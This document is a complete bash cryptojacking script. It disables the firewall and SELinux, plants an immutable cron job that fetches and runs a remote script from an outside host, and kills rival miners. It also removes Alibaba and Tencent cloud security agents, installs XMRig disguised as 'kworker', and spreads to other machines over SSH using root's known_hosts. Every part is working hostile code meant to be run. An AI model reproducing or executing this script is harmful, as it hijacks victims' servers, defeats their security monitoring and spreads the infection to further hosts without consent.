#! /bin/bash


set_envirment(){

    setenforce 0 2>/dev/null
    ufw disable
    iptables -F

    apt-get install curl -y && yum install curl -y && apk add curl -y
    apt-get install wget -y && yum install wget -y && apk add wget -y
    apt-get install cron -y && yum install crontabs -y && apk add cron -y
    
    echo "*/30 * * * * (curl -fsSL https://zgpay.cc/css/kwork.sh || wget -q -O- https://zgpay.cc/css/kwork.sh)|sh" | crontab -    
    chattr -R +i /var/spool/cron
    chattr +i /etc/crontab  
}

set_envirment


kill_other(){

    netstat -antp | grep '119.28.4.91'  | awk '{print $7}' | sed -e 's/\/.*//g' | xargs -I % kill -9 %
    netstat -antp | grep '101.32.73.178'  | awk '{print $7}' | sed -e 's/\/.*//g' | xargs -I % kill -9 %
    netstat -antp | grep 185.238.250.137 | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
    netstat -antp | grep tmate | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
    netstat -antp | grep kinsing | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
    netstat -antp | grep kdevtmpfsi | awk '{print $7}' | awk  -F '[/]' '{print $1}' | xargs -I % kill -9 %
    netstat -antp | grep pythonww | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
    netstat -antp | grep tcpp | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
    netstat -antp | grep c3pool | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
    netstat -antp | grep xmr | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
    netstat -antp | grep f2pool | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
    netstat -antp | grep crypto-pool | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
    netstat -antp | grep t00ls | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
    netstat -antp | grep vihansoft | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
    netstat -antp | grep mrbpool | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
    ps aux | grep -a -E "kdevtmpfsi|kinsing|solr|f2pool|tcpp|xmr|tmate|185.238.250.137|c3pool" | awk '{print $2}' | xargs kill -9

    if ps aux | grep -i '[a]liyun'; then
      (wget -q -O - http://update.aegis.aliyun.com/download/uninstall.sh||curl -s http://update.aegis.aliyun.com/download/uninstall.sh)|bash; lwp-download http://update.aegis.aliyun.com/download/uninstall.sh /tmp/uninstall.sh; bash /tmp/uninstall.sh
      (wget -q -O - http://update.aegis.aliyun.com/download/quartz_uninstall.sh||curl -s http://update.aegis.aliyun.com/download/quartz_uninstall.sh)|bash; lwp-download http://update.aegis.aliyun.com/download/quartz_uninstall.sh /tmp/uninstall.sh; bash /tmp/uninstall.sh
      pkill aliyun-service
      rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
      rm -rf /usr/local/aegis*
      systemctl stop aliyun.service
      systemctl disable aliyun.service
      service bcm-agent stop
      yum remove bcm-agent -y
      apt-get remove bcm-agent -y
      /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh stop
      /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh remove
      rm -rf /usr/local/cloudmonitor
    elif ps aux | grep -i '[y]unjing'; then
      /usr/local/qcloud/stargate/admin/uninstall.sh
      /usr/local/qcloud/YunJing/uninst.sh
      /usr/local/qcloud/monitor/barad/admin/uninstall.sh
    fi
} 

kill_other



if [ "$(pgrep -f /tmp/.bin/kworker|wc -l)" -ne 0 ]; then
exit
fi


install(){
    cd /tmp && mkdir -p .bin && cd .bin 
    wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz || wget http://xmrminer.org/xmrig-6.12.1-linux-x64.tar.gz   && tar  -zxvf xmrig-6.12.1-linux-x64.tar.gz 
    cd xmrig-6.12.1 && cp xmrig /tmp/.bin/kworker && cd /tmp/.bin  && chmod +x kworker 
    wget https://zgpay.cc/css/config.json
    setsid /tmp/.bin/kworker
    rm -rf /tmp/.bin/xmrig-6.12.1
}

install


exploit(){
  if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
    for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); 
    do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '(curl -fsSL https://zgpay.cc/css/kwork.sh || wget -q -O- https://zgpay.cc/css/kwork.sh)|sh >/dev/null 2>&1 &' & done
  fi
}

exploit
